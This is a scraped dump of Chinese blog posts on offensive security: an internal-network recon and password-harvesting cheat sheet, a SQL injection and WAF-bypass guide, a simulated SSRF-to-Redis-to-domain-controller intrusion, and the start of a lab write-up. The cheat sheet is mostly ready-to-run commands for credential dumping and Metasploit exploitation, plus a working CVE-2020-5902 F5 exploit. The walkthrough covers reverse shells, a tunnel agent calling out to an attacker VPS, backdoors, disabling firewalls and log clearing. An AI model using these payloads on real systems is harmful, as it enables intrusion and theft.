/domain nltest /domain_trusts # 域信任查询 # 信息提取，提起猜测可能是“admin&quot;的用户，后续收集信息完善使用 awk -F &quot; &quot; {'print $1'} user.txt &gt;&gt; user.txt awk -F &quot; &quot; {'print $2'} user.txt &gt;&gt; user.txt awk -F &quot; &quot; {'print $3'} user.txt &gt;&gt; user.txt egrep -i &quot;admin|manage|vpn&quot; list_user.txt # 批量获取当前域的所有域控及其内网IP net group &quot;domain controllers&quot; /domain # 获取域控，获取结果不全 net group &quot;Read-only Domain&quot; # 获取只读权限的域控 for /f &quot;delims=&quot; %i in (dc.txt) do @ping -w 1 -n 1 %i | findstr /c:&quot;mark.com&quot; &gt;&gt; news.txt # 批量ping nltest /dclist:DC # 判断主控所在位置 # 获取当前域中的所有组，提取关键的组即可 net group /domain # 对所获得的组进行分类，细化各组的职能，定点收集 03. SPN扫描利用 # SPN 组成部分： # 服务类型 对应机器名 服务端口 默认端口可不写 MSSQLSvc/Srv DB 0day.0day.org:1433 SPN 有价值目标： 各类 基础 数据库服务： MSSQLSvc SQL Server 数据库 Oracle O racle 基于 kerberos 认证 postgres postgresql 数据库 各类 基础 mail 服务 exchangeMDB exchange 相关服务 SMTPSVC SMTP 服务 IMAP IMAP 服务 POP3 POP3 服务 各类 基础 Web 服务 HTTPS web 服务 基于 kerberos 认证 HTTP web 服务 基于 kerberos 认证 Jboss java web 服务 中间件 Redhat jboss 各类 基础 文件 服务 DNS DNS服务 FTP FTP服务 NFS NFS服务 各类远程管理 类 服务 TERMSRV Windows RDP 远程桌面服务 WSMAN Windows 远程管理服务 vnc VNC VPN 远程接入服务 通过spn定向寻找数据库相关服务： # Windwos 7 以后都默认自带setspn setspn T DC-Name Q */* | findstr &quot;MSSQLSvc&quot; # 直接过滤Mssql服务 # 因为得到的spn结果，可能都不存活，我们批量Ping一下，判断存活 awk F &quot;/&quot; {'print $2'} mac.txt | awk F &quot;.&quot; {'print $1'} | uniq &gt; res.txt for /f &quot;delims=&quot; %i in (res.txt) do @ping w 1 n 1 %i | findstr /c:&quot; DC-name &quot; &gt;&gt; PerfLogs news.txt setspn T dc-name Q */* | findstr &quot;oracle&quot; # 同理过滤“Oracle服务”，其他同类数据库服务也如此 借助 SPN 快速 定位当前目标 域中 所有 存活 的 ldap 服务器： # 通常情况下，都为域控制器 setspn T dc-name Q */* | findstr &quot;ldap&quot; # 所有 LDAP SPN 的 机器名 都带有典型 的 DC 字样 借助 SPN 快速 定位当前目标 域中 邮件 服务器： setspn T dc-name Q */* | findstr &quot;exchangeMDB&quot; setspn T dc-name Q */* | findstr &quot;SMTPSVC&quot; setspn T dc-name Q */* | findstr &quot;IMAP&quot;c v setspn T dc-name Q */* | findstr &quot;POP3&quot; awk F '/' {'print $2'} mail.txt | awk F '.' {'print $1'} | uniq # 筛选各类主机名 # 批量存活探测 for /f &quot;delims=&quot; %i in (mail.txt) do @ping w 1 n 1 %i | findstr /c:&quot; dc-name &quot; &gt;&gt; mail-re.txt 借助 SPN 快速 定位当前目标 域中 Web 服务器： setspn T dc-name Q */* | findstr &quot;HTTP&quot; setspn T dc-name Q */* | findstr &quot;HTTPS&quot; for /f &quot;delims=&quot; %i in (webs.txt) do @ping w 1 n 1 %i | findstr /c:&quot; dc-name &quot; &gt;&gt; # Web服务 借助 SPN 快速 定位当前 目标 域 中 所有 存活的 DNS 服务器 setspn T dc-name Q */* | findstr &quot;DNS&quot; for /f &quot;delims=&quot; %i in (dns.txt) do @ping w 1 n 1 %i | findstr /c:&quot; dc-name &quot; &gt;&gt; dns.txt 借助 SPN 快速 定位当前 目标 域 中 所有 存活的 文件 服务器 setspn T dc-name Q */* | findstr &quot;ftp&quot; setspn T dc-name Q */* | findstr &quot;nfs&quot; for /f &quot;delims=&quot; %i in (ftp.txt) do @ping w 1 n 1 %i | findstr /c:&quot; dc-name &quot; &gt;&gt; dns.txt 借助 SPN 快速 定位当前 目标 域 中 所有 开启远程 连接服务 服务器 setspn T dc-name Q */* | findstr &quot;TERMSRV&quot; &gt;&gt;&gt; PerfLogs rdp .txt setspn T dc-name Q */* | findstr &quot;WSMAN&quot; &gt;&gt; C: PerfLogs winrm .txt setspn T dc-name Q */* | findstr &quot;vnc&quot; &gt;&gt; C: PerfLogs vnc .txt setspn T dc-name Q */* | findstr &quot;vpn&quot; &gt;&gt; C: PerfLogs vpn .txt setspn T dc-name Q */* | findstr &quot;tnetdgines&quot; &gt;&gt; C: PerfLogs tnetdgines .txt awk F '/' {'print $2'} **.txt | awk F '.' {'print $1'} | uniq | wc -l 04. 内网密码收集： # Mssql配置文件搜集: dir /b /s web.config findstr /c:&quot;User ID=&quot; /c:&quot;Password=&quot; /si web.config # Seatbelt,导出详细信息 Seatbelt -group=all # 列出当前目录结构： tree /A |findstr /BV /C:&quot;| |&quot; # 针对特定类型的敏感文件进行全盘遍历搜集，比如, 文件类型： *.xlsx,*.doc,*.docx,*.txt,*.zip,*.rar,*.7z,*.ovpn,*. vsdx,*.ppt,*pptx,*.php,*.sql,*.md # 全盘搜带有以下敏感字段的文件,其实还有非常非常多,弟兄们平时在搞的过程中最好一边搞一边积累，常见关键字： &quot;密码(pass)&quot;, &quot;账号(user)&quot;, &quot;VPN&quot;, &quot;SVN&quot;,&quot;GIT&quot;, &quot;账户(user)&quot;, &quot;交接&quot;, &quot;离职&quot;, &quot;登录(login)&quot;, &quot;账密&quot;, &quot;堡垒&quot;, &quot;邮箱(Mail)&quot; , &quot;IT&quot;, &quot;信息安全&quot;, &quot;IT部&quot;, &quot;备份(bak)&quot;, &quot;管理员(admin)&quot;, &quot;内网&quot;, &quot;杀毒&quot; , &quot;入职&quot;, &quot;服务器&quot; , &quot;运维&quot; , &quot;平台&quot;, &quot;巡检&quot;, &quot;拓扑&quot;, &quot;资产&quot;, &quot;网络&quot;, &quot;系统&quot;, &quot;后台(system)&quot; , &quot;漏洞&quot;, &quot;扫描&quot;, &quot;数据库&quot;, &quot;交换机&quot;, &quot;ERP&quot;, &quot;防火墙&quot; , &quot;防毒墙&quot;, &quot;合同&quot;, &quot;虚拟&quot;, &quot;集群&quot;, &quot;通讯录&quot;, &quot;订单&quot; &quot;办公&quot;, &quot;权限&quot;, &quot;隔离&quot;, &quot;测试&quot; &quot;网闸&quot;, &quot;监控&quot;, &quot;设备&quot;, &quot;简历&quot;, &quot;工资&quot; dir /s /b &quot;*密码*&quot; &quot;*登录*&quot; &quot;*资产*&quot; &quot;*VPN*&quot; &quot;*Svn*&quot; &quot;*Git*&quot; &quot;*交接*&quot; &quot;*离职*&quot; &quot;*网络*&quot; &quot;*后台*&quot; &quot;*拓扑*&quot; &quot;*邮箱*&quot; &quot;*工资*&quot; &quot;*管理员*&quot; &quot;*巡检*&quot; # Server 端配置文件密码收集： findstr /I /c:&quot;user=&quot; /c:&quot;pass=&quot; /c:&quot;login=&quot; /c:&quot;uid=&quot; /c:&quot;pwd=&quot; /si *.conf *.asp *.php *.jsp *.aspx *.cgi *.xml *.ini *.inf *.txt *.cgi 0x03 内网基础资源横向探测 05. 从主机开始入手： # 通过代理将Msf挂到内网去： msf &gt; setg Proxies socks5:127.0.0.1:1080 # 通过批量提取到mssql的Hash,Msf使用auxiliary/scanner/mssql/mssql_hashdump模块 msf &gt; use auxiliary/admin/mssql/mssql_sql # SQL语句模块 msf &gt; use auxiliary/admin/mssql/mssql_exec # SQL_exec模块 msf &gt; use auxiliary/scanner/mssql/mssql_hashdump # SQL_Hash模块 # MSf主机批量Smb探测: msf &gt; use auxiliary/scanner/smb/smb_version # 批量mS17-010 msf &gt; use auxiliary/scanner/smb/smb_ms17_010 # 通过MS17-010_Command模块，进行批量密码搜寻 dir /b /s web.config findstr /c:&quot;User ID=&quot; /c:&quot;Password=&quot; /si web.config &gt;tmps.logs cscript katz.js &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; # 将所有密码Hash整合，再去撞Hash： msf &gt; use auxiliary/scanner/smb/smb_login 06. 从各类Web服务开始入手： # 确定具体目标，先从单端口，多网段进行探测,线程拉低： msf &gt; use auxiliary/scanner/portscan/tcp # 同时对在公网上收集的信息，进行批量ping，筛选所对应的内网服务，重点关注 for /f &quot;delims=&quot; %i in (domains.txt) do @ping -w 1 -n 1 %i | findstr /c:&quot;mark.com&quot; &gt;&gt; service.txt type service.txt | findstr &quot;10.&quot; # 快速探测识别目标内网所用的各类基础java web服务 msf &gt; use auxiliary/scanner/http/jboss_vulnscan msf &gt; use auxiliary/admin/http/tomcat_administration msf &gt; use auxiliary/scanner/http/jenkins_login msf &gt; use auxiliary/scanner/http/glassfish_login msf &gt; use auxiliary/scanner/http/axis_login msf &gt; use auxiliary/scanner/http/webdav_scanner msf &gt; use exploit/windows/iis/iis_webdav_scstoragepathfromurl msf &gt; use auxiliary/scanner/http/http_login msf &gt; use auxiliary/scanner/http/joomla_version msf &gt; use auxiliary/scanner/http/wordpress_scanner msf &gt; use auxiliary/scanner/http/phpmyadmin_login 07.从各类服务弱口令入手: # Linux SSH版本探测确认具体使用那些版本的Linux系统： msf &gt; use auxiliary/scanner/ssh/ssh_version msf &gt; use auxiliary/scanner/ssh/ssh_enumusers # 探测完用户后，通过前期收集的密码，进行单密码碰撞 # Windows 服务探测： msf &gt; use auxiliary/scanner/rdp/rdp_scanner # RDP探测 msf &gt; use auxiliary/scanner/vnc/vnc_login # VNC探测 # 各类工控设备的telnet默认口令： msf &gt; use auxiliary/scanner/telnet/telnet_version # 文件服务探测，寻找敏感信息： msf &gt; use auxiliary/scanner/ftp/ftp_version # FTP批量常识读写： msf &gt; use auxiliary/scanner/ftp/anonymous # 搜集NFS挂载： msf &gt; use auxiliary/scanner/nfs/nfsmount # rsync，Web同步常用，搜集配置文件： msf &gt; use auxiliary/scanner/rsync/modules_list # SVN 泄露探测: msf &gt; use auxiliary/scanner/http/svn_scanner # 各类数据库： msf &gt; use auxiliary/scanner/mysql/mysql_version # MySQL msf &gt; use auxiliary/scanner/db2/db2_version # DB2 msf &gt; use auxiliary/scanner/postgres/postgres_login # PostGreSQL msf &gt; use auxiliary/scanner/redis/redis_login # Redis，重点关注 # 对上面的结果进行,批量SQL命令执行： msf &gt; use auxiliary/scanner/redis/redis_server msf &gt; use auxiliary/scanner/mongodb/mongodb_login # MongoDB 弱口令 # Mail通过邮件服务进行探测： msf &gt; use auxiliary/scanner/smtp/smtp_version # SMmtp版本 msf &gt; use auxiliary/scanner/imap/imap_version # imap版本探测 msf &gt; use auxiliary/scanner/pop3/pop3_version # pop3版本探测 msf &gt; use auxiliary/scanner/lotus/lotus_domino_version # lotus版本探测 msf &gt; use auxiliary/scanner/http/owa_ews_login # 特定版本zimbra漏洞利用 msf &gt; use exploit/unix/webapp/zimbra_lfi # 漏洞利用 08. 从各类工控网络设备入手： # CISCO msf &gt; use auxiliary/scanner/http/cisco_device_manager # Cisco-VPN msf &gt; use auxiliary/scanner/http/cisco_ssl_vpn # 批量扫描内网下的所有f5设备，通过扫描结果批量探测F5RCE漏洞 msf &gt; use auxiliary/scanner/http/f5_bigip_virtual_server #!/usr/bin/env python # -*- coding: utf-8 -*- # project = https://github.com/Xyntax/POC-T # author = i@cdxy.me &quot;&quot;&quot; F5 BIG-IP TMUI 远程代码执行漏洞（CVE-2020-5902） F5 BIG-IP 是美国 F5 公司的一款集成了网络流量管理、应用程序安全管理、负载均衡等功能的应用交付平台。2020年7月1日，F5官方公布流量管理用户界面（TMUI）存在 前台远程执行代码（RCE）漏洞（CVE-2020-5902）。攻击者利用该漏洞，构造恶意请求，在未授权的情况下获得目标服务器的权限，实现远程代码执行。 Usage python POC-T.py -s BigF5_Rce -iF target.txt python POC-T.py -s BigF5_Rce -aZ &quot;&quot; &quot;&quot;&quot; import requests from plugin.useragent import firefox from plugin.urlparser import iterate_path def poc(target): print target base_url = target if &quot;://&quot; in target else 'https://' + target for each in iterate_path(base_url): try: url = each + '/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd' #print url g = requests.get(url, headers={'User-Agent': firefox()}) if g.status_code is 200 and 'output' in g.content and 'root' in g.content: return url url = each + '/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin' g = requests.get(url, headers={'User-Agent': firefox()}) if g.status_code is 200 and 'error' in g.content and 'password' in g.content: return url except:pass return False # 批量扫描内网下的dlink后门 msf &gt; use auxiliary/scanner/http/dlink_user_agent_backdoor # 批量探测内网下的zabbix web入口弱口令 msf &gt; use auxiliary/scanner/http/zabbix_login # 批量探测内网下的splunk[主要用于大数据分析] web入口弱口令 msf &gt; use auxiliary/scanner/http/splunk_web_login # 批量探测下的 snmp挂到socks下跑可能会有些问题,应该是udp协议的问题 弱口令,实际中,万一真的没办法,不妨用这个试着搜集内网机器信息 msf &gt; use auxiliary/scanner/snmp/snmp_login 09.核心系统核心网段探测： (1) 外网资产列表 通过对外部打点时收集到的各类Web资产，批量提取URl，适用于，在获得内网跳板时，已经控下几台机器但是找不到核心资产的情况，将提取的URL，在内网机器上，通过Bat脚本，进行批量Ping提取解析IP为内网IP的资产，重点关注这些网段,刘哥给提供的bat思路，自己可以继续修改: Windows 系统环境： # 筛选的关键字，我们可以根据实际情况修改，因为在一些大型公司内部，因为资产的庞大，网络划分直接划分为国外公网IP： for /f &quot;delims=&quot; %i in (web.txt) do @ping -w 1 -n 1 %i | findstr /c:&quot;[10.&quot; /c:&quot;[192.&quot; /c:&quot;[172.&quot; &gt;&gt; out.txt (2) 批量Web Title &amp; Header提取 通过前面阶段的收集，对于获取到的资产网段，我们筛选常用端口： 80-90，8080， 8090，7001端口，进行批量的Web Title 提取，具体实现方法： Klion思路，通过Curl以及批处理脚本，简单快捷方式解决： 我通过Python垃圾实现： (3) DNS爆破枚举： 进行单IP多网段扫描，定位具体DNS服务器位置，通过网络配置也可以判断DNS具体IP： # DNS缓存查看： ipconfig /displaydns 在获得DNS具体IP后，通过各类DNS爆破工具进行枚举和爆破，最终效率需要看字典内容 # Klion推荐项目： https://github.com/Q2h1Cg/dnsbrute 0x04 思路汇总： Klion总结，自己完善总结作为自己测试时的Check-List： 获取当前Shell的详细权限属性信息(即priv的内容),区分当前是本地用户还是域用户 获取当前机器的详细网络配置信息,包括 dns后缀,DNS后缀搜索列表,ip,掩码,网关,主备dns ip,dns缓存 获取当前机器的详细系统配置信息,包括 当前系统详细版本,内核版本,位数,启动时间,网卡信息,是否虚拟机,哪种虚拟机 [eg: VMWARE,VDI(一般从厂商名能看出来)......] 获取当前机器的 各类敏感 服务 / 进程列表 需要特别关注的一些敏感进程:各类常见杀软进程 [ 赛门铁克, 360套装(包括天擎), 麦咖啡, ESET, 卡巴, 趋势, WindowsDefender, Sophos, 火绒, QQ管家...... ] 常规监控系统的agent端进程 [ Zabbix, Cacti(默认用snmp远程搜集系统信息), Nagios] 敏感工具进程 [ Chrome,Firefox,Edege,IE,Xshell,Xftp,SecureCRT,Navicat,TortoiseSVN,Git,Foxmail,Filezilla,Vnc,Putty,Office套件,Teamviewer,向日葵...] 可疑恶意敏感进程 [ Powershell.exe, mshta.exe, cmd.exe,cscript.exe .... ] 各类Java服务进程 [ 通常Java权限较高,后面提权可能会用得到 ] 包括对应进程的详细用户权限 需要特别关注的一些敏感服务: 本机各类Web服务 本机各类数据库服务 本机各类杀软 / EDR服务 本机各类常规监控的相关服务： 获取当前机器的所有Tcp / Udp 端口连接状态信息,顺手重点关注那些后期可用来&quot;提权&quot;或者搜集密码的各类敏感服务端口 获取当前机器的所有已经安装软件列表(留后门,抓密码可能会用得到) 获取当前用户浏览器 [ Chrome,Firefox,Edge,IE,360,QQ ] 的各类敏感数据,eg: 保存的账号密码,收藏夹链接,历史浏览记录,Cookie [ 注: 如浏览器正在运行可能无法获取相关数据 ] 获取当前用户Windows凭据管理器中保存的各类账号密码 获取当前用户的浏览器代理ip和端口 出网刺探,查看当前机器能否正常出网 [ Tcp / Udp / Dns /icmp ] 获取当前机器的 &quot;关键性本地组&quot; 成员 [ 比如,本地管理组,远程桌面组 ] 获取本机已启用的共享 获取当前用户回收站,桌面里的文件目录列表 获取最近运行的命令历史和访问过的文件记录 获取当前机器的所有Rdp连出记录 [ 不包括连入记录 ] 获取当前系统的防火墙状态 [开启 / 关闭] 获取当前机器根下的计划任务列表 获取当前用户的注册表自启动项列表 获取当前机器的所有IPC会话 获取当前机器的Powershell 和 .Net 版本 获取当前机器的WIFI连接账号密码 获取当前机器中的服务票据 [ 待后续拿到管理权限后可进行PTT操作 ] 获取当前机器的详细补丁列表 获取本机ARP / DNS 缓存记录 获取本机host文件内容 获取当前用户环境变量 定时跟踪操作截屏 [ 需要在指定用户环境下操作 ] 获取当前系统的Laps配置 [ 如果有 ] ","link":"https://1oecho.github.io/NET-01/"},{"title":"SQL注入漏洞利用技巧总结","content":"SQL注入&quot;Strange-Tps&quot;汇总 0x01 什么是SQL注入？ SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。 这是百度百科给的定义，我们通俗来讲: 就是恶意用户构造SQL语句插入到原有SQL语句中，被服务正常的执行利用，从而获得了超出当前用户权限的数据库内部资料。 所以我们就要把握好侧重点，你的SQL语句被服务执行！ 0x02 漏洞探测 一. 基础的测试流程大致为： 判断注入的类型(字符,数字,搜索...) 判断后端数据库类型(Oracle,MySQL,Mssql,PostgreSql...) 判断语句是否被成功执行(构造差异条件...) 判断当前环境可以利用的注入方式(sqlmap的分类: 堆叠注入，联合查询，报错注入，布尔盲注，时间盲注..利用效率从高到低） 判断后端安全方式(无防护，黑名单，白名单，WAF...利用难度依次递增) 二. 步骤细节： 一. 注入类型判断： 我们可以通过当前也去环境交互的数据来判断，与数字型相比，需要逃逸字符，后续闭合逃逸出的字符，在真实情况下，最多的情况！数字型会执行我们构造的运算条件，而字符型则会异常或不执行 (1) 服务直接报错！ 插入\\，发现为单引号闭合' 判断为字符型，反之\\后无字符，为数字型: 字符型 数字型: (2) 加入算数运算符，SQL语句异常，页面会不变，因为我们加入的算数条件没有被正常执行，所以无异常，判断为字符型，反之为数字型： 字符型，正常情况： 字符型，添加运算条件后(加减乘除都可以加，主要url编码)： 数字型，添加运算条件后(加减乘除都可以加,注意url编码)，因为SQL语句正确被执行，导致数据库内部错误，显示的内容，也会异常： 搜索型注入和字符型一样都需要闭合语句，后续注释逃逸出的字符： 1). 搜索型注入通过 % 来闭合 2). 字符型需要通过fuzz来测试闭合,常用: ' &quot; ') &quot;): fuzz姿势如下，总结所有的可能的闭合方式: ' &quot; '' '&quot; ; ) ') &quot;) &quot;); '; &quot;; %' %&quot; %') %&quot;) ')) &quot;)) &quot;))) BurpSuit标记字符的位置，同时加上注释符 # --,判断返回页面差异，从而准确判断闭合的字符 结果判断，因为正常执行会输出Your Login name:Dumb,我们如果成功闭合则内部SQL就会执行1/0的操作，从而内部错误，显示异常，不输出登录名，以此为差异来判断结果： 标记√号的是存在字符，不标记的为不存在关键字 我们查看不存在标记的数据包,paylaod的共同点，都存在单引号',通过此我们便可以知道需要闭合的字符为单引号'，其他的同样如此： 我们找一个单引号括号')的例子来看，构造个减的条件，id=2，name: Angelina id=3, name: :Dummy,如果语句正常执行，将返回id=2的内容： 同理找共同点，为 单引号括号'),所以闭合方式为: 单引号括号') 二.后端数据库类型判断： 1. 直接回显错误！ 通过报错语句来判断： MSQL Oracle mssql 会直接报出 Sql server的相关错误，从而可以判断 2. 通过特定注释符号来判断： MySQL （1）如果说既能够使用–--作为注释标志，又能够使用#做注释标志，那么基本可以确定是 MySQL （2）行间注释 /!version command/，这样的语法是 MySQL 专属，其中 version 是一个数字，如果 MySQL 的版本大于这个数字的话就会把 command 作为 SQL 语句的一部分。 /!50000SELECT/ Oracle (1) 通过/**/ -- 来注释，则为oracle数据库 3. 通过特定函数来判断： MySQL （1）既能使用substr也可以使用substring,判断为MySQL ​ (2) 能够使用 trim 函数、 rtrim 函数、 ltrim 函数，但是不能使用 btrim 函数（Postgresql 以及 AWS Redshift SQL 所有） ​ (3) conv、load_file（读取文件的函数需要权限）、benchmark... ​ (4) database() user() @@datadir等等内置函数 Oracle ​ (1) 版本探测方式：select version from v$instance; ​ (2) 当前数据表探测方式： select name from v$database'; ​ (3) ： 支持 minus select 是 ORACLE 的显著特征..等等 mssql ​ (1) waitfor delay time延时注入，可以确定是 SQL Server ​ (2) Top语法的使用 4. 通过字符串连接符来判断 MySQL,通过使用''来连接字符串 Oracle，通过 ||来连接字符串 Mssql，通过+来连接字符串 5. 通过特定数据库数据表来判断 Mysql， information_schema Oracle, SYSAUX表,SYSTEM表,TEMP表,UNDO表,USERS表 Mssql, master..sysmessages、master..sysservers 6. 通过主流搭配方案来判断： MySQL， 常用于后端为php Oracle, 常用于后端为java Mssql, 常用于后端为.net 7. P牛的集大成测试方式： MySQL SELECT ... WHERE title REGEXP BINARY '^(An?|The) +'; -- MySQL Oracle SELECT ... WHERE REGEXP_LIKE(title, '^(An?|The) +', 'c'); -- Oracle MSsql SELECT ... WHERE title LIKE '%[^A-Z]%' -- Mssql PostgreSQL SELECT ... WHERE title ~ '^(An?|The) +'; --postgreSQL 三.语句执行构造： 注意： 在测试时避免使用 and 1=1 这样大概率被拦截的语句，来探测SQL注入漏洞 （一）MySQL 数据库的注入探测技巧： 构造运算符来判断： 除法（加减乘取余同理）： 取余： 在参数后添加注释符，页面正常返回 通过MySQL的特性，隐式类型转换来判断,(要结合具体环境来使用): 通过构造逻辑运算符，配合比较运算符来判断: Example（相互配合起来灵活应用）: (1). 构造 &amp;&amp; 3&lt;&gt;1+--+ ,等价于and，注意url编码： 真： 假： (2). 构造 false || 3&gt;1+--+ (MySQL为或等价于or，Oracle为连字符) 真： 假： （3）通过条件判断语句配合1/0来判断(我最常用的方式) 此Payload适用于MySQL和ORacle http://192.168.111.1/sqli/Less-1/?id=-1' DIV (case when 3&gt;1 then 1 else end)+--+ cash when 条件 为真执行: then 1,就是最终结果为1，1/1=1，语句正确 为假执行：else 0,就是最终结果为0，1/0 Mysql返回空 Oracle内部报错 真： 假： （4）短路and报错来判断注入： 适用于回显为: (1) SQL语句正确，返回一种情况; SQL语句错误返回一种情况 http://192.168.111.1/sqli/Less-1/?id=1'+and+1=(case when 3&lt;1 then 1 else 0 end)+and+pow(999,999)--+ 同理的有很多，只要构造好报错条件，短路and即可，可以用&amp;&amp;代替and http://192.168.111.1/sqli/Less-1/?id=1'+and+1=(case when 3&lt;1 then 1 else 0 end)+and+~0--+ 为真，语句正常执行，报错条件执行，语句报错 为假，语句正常执行，报错条件因为and短路，不执行报错语句，内部错误 把握好重点即可，配合不同函数，能够成功判断并且确认，语句被正常执行了，就是存在SQL注入，配合延时也是同样道理 三 判断当前环境可以利用的注入方式 注入方式优先级排序(个人认为): 堆叠注入 &gt;= 联合查询注入 &gt; 报错注入 &gt; 布尔盲注 &gt; 时间盲注 堆叠注入如果存在，直接通过;闭合上一段语句构造新语句即可执行 联合查询注入，如果目标业务存在显示位，我们先判断列数，在判断显示位，从而后续构造语句直接查询，适用于直接返回SQL错误的目标 报错注入，构造报错条件，通过报错带出我们查询的数据，适用于直接返回SQL错误的目标 时间盲注，判断条件为时间条件，或者是大量运算所造成的高于正常的延时操作，以此为条件查询数据 布尔盲注，我重点叙述，上面SQL判断阶段的描述配合查询数据即可，与时间盲注为我们真实测试中最常遇到的情况 四 判断后端安全方式 黑名单,白名单： 就是在业务编写阶段为防止SQL注入，而禁用了一些特殊字符，比如数据库函数，注释符等等 测试流程： 通过Fuzz模糊测试，判断后端具体过滤函数，从而找出缺陷函数，来绕过黑名单限制，通常SQL注入的CTF所选用的方式 找到漏网之鱼的函数，配合逻辑语句查询数据内容 找常用注入语句中关键字的替代品 WAF (Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品。) 我只写出我在测试中常用的方法，全部方法可以看公众号bypass里面的详细专题： 一. 找缺陷函数和替代品以及数据库特性： ascii()函数 可以用 char() ,函数代替 and逻辑判断，可以使用 &amp;&amp; 代替 or逻辑判断， 可以使用||代替 空格， 可以使用 %00-%0z 注释符 /**/替代 /!50000SELECT/ MySQL 特性 如果 MySQL 的版本大于5.00.00的话就会把 SELECT 识别出来。这个特性同样可以用来探测 MySQL 的版本号 二. 改变请求方式，get post 转换为上传文件类型的 multipart类型 一些WAF在进行数据包解析处理时，可能会存在类似的设计缺陷。例如在处理普通的GET、POST型请求时，会进行SQL注入、XSS等攻击特征的匹配。但是在处理multipart请求时，很可能只对类似恶意文件上传等攻击（文件上传包相关）进行检测， SQL注入等攻击就不再进行规则匹配了。那么此时若尝试以multipart方式进行业务提交，并且植入恶意的注入攻击语句，若服务器能解析的话，即可绕过WAF进行注入深入利用。 测试方法： BurpSuit 右键，选择： 转换为下面效果： 三.垃圾数据填充 有些WAF，因为性能的需要向业务做出妥协，当数据包超过WAF的规定阈值后，有的会丢弃掉数据包，而有的也会直接通过数据包，利用这个特性，我们构造超长的数据包便可以绕过waf 测试方法: 添加无用的字符串，SQL注入注释符中添加 添加多个同样的Cookies（截图为随意添加，真实环境把原有Cookies复制粘贴，增加即可），增大数据包的体积 四 分块传输 分块传输编码（Chunked transfer encoding）是超文本传输协议（HTTP）中的一种数据传输机制，允许HTTP由网页服务器发送给客户端应用（ 通常是网页浏览器）的数据可以分成多个部分。分块传输编码只在HTTP协议1.1版本（HTTP/1.1）中提供。 测试方法： 推荐查看大佬文章：https://gv7.me/articles/2019/chunked-coding-converter/ 利用方式以及工具，里面都有；目前新版的Sqlmap已经支持分块传输，参数为：--chunked 0x03 总结 先写这么多，还有 order by update insert limit 等等的注入，后续补充 持续更新，有错私信我修改 点击 whoami私我！！ ","link":"https://1oecho.github.io/all-in-sql/"},{"title":"实战模拟: SSRF-->Redis-->DC 全过程记录","content":"因为最近遇到一次实战，环境较为敏感，就不通过用真实环境来记录了。 我通过模拟环境来记录最终拿下域控的全过程，网络环境如下： 通过Vulstack的靶场模拟内网环境 同DMZ网段，一台Linux做Redis和公网WEB服务机器,不在域内 存在内网WEB服务，并且内网WEB服务在域内 0x01 外网突破： 在进行打点测试时，发现Web应用存在SSRF漏洞(通过Demo模拟)，探测后发现协议没有限制，先探测一下本机的端口： 发现6379端口开启，猜测为Redis，通过dict操作发现，存在未授权访问漏洞,版本为5.0.9： 可以通过Gopher协议写计划任务实现反弹shell，反弹shell到公网，通过一个小工具，生成Gopher数据： 收到Shell，是一个哑Shell，目标机器存在Python环境，我们通过Python弹一个完整Shell # 执行命令： python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)' 得到Shell： 0x02 内网隧道建立： 先看一下网络结构，192.168.135.0，通过Venom将目标内网流量代理出去： 将agent下载到目标机，将流量转发出去： # 目标机执行： ./agent_linux_x64 -rhost vps-ip -rport 9999 进入节点，启动代理： 本机配置好全局代理，探测网段192.168.135.0/24，端口扫描结果如下，重点关注192.168.135.150 访问一下，ThinkPHP框架，存在RCE 0x03 横向渗透 通过RCE,发现是台Windows主机，出外网,先排查下目标机器有没有AV或者杀毒，排查后没有杀毒 直接CS生成Payload,远程下载执行，上线成功： 等主机上线后我们就可以把代理关闭了，以后在启动代理通过CS启动就可以，给Linux主机种一个SSH后门，隐藏一个文件，作为启动文件，开始进行横向渗透： 通过MS14-058提权，获得管理员权限： 抓密码和hash,维持好权限: 收集一下网段信息，以及域内机器，真实环境中，还有各类域内服务， Ping一下，得到域控IP： 192.168.138.138，Arp-a查看所有ARP缓存表中的所有信息： 结构很明确了，下一步直接拿域控，因为密码已经抓到了明文直接伪造Token，来上线域控 在Web服务器上起一个中转监听，以后域内机器都通过Web来进行中转，查看域内机器，远程上线域控： 直接上线，因为Web服务器的防火墙时开启的，我们暴力一点直接远程关闭防火墙，然后上线域控： 最终结果： 后续清理各类日志，维持权限，可以通过反射dll来维持，效果极佳 权限持好后，就可以进行数据收集以及密码查找 收集的关键信息在横向，收集到信息在横向，最终撸穿内网 0x04 总结 相对基础的的一次渗透过程，真实环境中，也是外网进去，拿到了域内Web服务器，真实环境就不放了..主要工具免杀以及权限维持都会花费大量时间 SSRF--&gt;Redis--&gt;DC 全过程的起点都是小小的一个SSRF，可见危害是及其严重的 继续努力，早日脱菜 0x05 所用到的工具： https://github.com/Dliv3/Venom Venom是一款为渗透测试人员设计的使用Go开发的多级代理工具 https://github.com/LS95/gopher-redis-auth gopher-redis-auth生成工具 ","link":"https://1oecho.github.io/X8bxOrMBK/"},{"title":"ATK&CK红队评估靶场 (二) WriteUp","content":"0x00 网络环境 拓扑如下: 网段信息: 配置网络,防火墙策略墙策略,启动Weblogic 攻击机IP: 192.168.111.1 0x01 寻找入口点 DMZ网段为:192.168.111.1/24,Web服务IP:192.168.111.80 1. 先进行服务的探测: 在实际过程中,信息收集决定你攻击的深度,信息量越大对以后渗透越有帮助! 可以通过下面的工具进行资产的大致排查,实际环境应该要涉及的信息收集会广,通常在对于端口探测时,要结合多种工具进行探测,实现异构防止误报,在对各工具的结果进行筛选后,得到最终结果! Nmap 端口指纹识别 Msscan 端口扫描 yujianscan 端口指纹目录等等 Goby (实验测试就直接通过Goby来实现资产的探测) 基本探测结果如下: ​ 存在问题： 1) 存在Weblogic中间件,并且存在 Weblogic IIOP RCE (CVE-2020-2551)漏洞,可GetShell 2) 存在Eternalblue/DOUBLEPULSAR MS17-010 SMB RCE 永恒之蓝,可GetShell 3) . 先得到WebShell: 